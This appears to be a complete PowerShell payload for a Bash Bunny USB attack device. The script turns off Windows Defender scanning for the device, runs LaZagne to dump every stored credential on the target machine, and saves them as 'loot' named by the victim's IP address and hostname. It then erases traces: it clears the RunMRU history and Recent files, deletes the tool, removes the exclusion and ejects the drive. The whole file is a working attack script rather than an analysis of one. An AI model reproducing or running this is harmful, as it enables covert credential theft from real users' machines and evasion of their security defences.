$BLABEL = (gwmi -class win32_volume -f {label = "BASHBUNNY"}).DriveLetter
Add-MpPreference -ExclusionPath "$BLABEL"
Expand-Archive -Force $BLABEL\lazagne.zip $BLABEL\lazagne
$LPATH = & $BLABEL\lazagne\lazagne.exe all -vv
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address
$tar_hostname = hostname
mkdir $BLABEL\loot\LaZassword
$LOOTFILE = "$BLABEL\loot\LaZassword\$ipV4$tar_hostname.txt"
$LPATH | Out-File -FilePath $LOOTFILE
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item "$BLABEL\lazagne\" -recurse
Remove-MpPreference -ExclusionPath "$BLABEL"
New-Item -Path "$BLABEL\loot\LaZassword\done" -ItemType File 
stop-process -Name explorer
Get-ChildItem -Path C:\Users\\$env:UserName\AppData\Roaming\Microsoft\Windows\Recent -Include * -File -Recurse | foreach { $_.Delete()}
$bb = (gwmi win32_volume -f 'label=''BASHBUNNY''').Name
$driveEject = New-Object -comObject Shell.Application
$COUNT=1
while ($COUNT -ne 5){
$driveEject.Namespace(17).ParseName("$bb").InvokeVerb("Eject")
$COUNT++
}
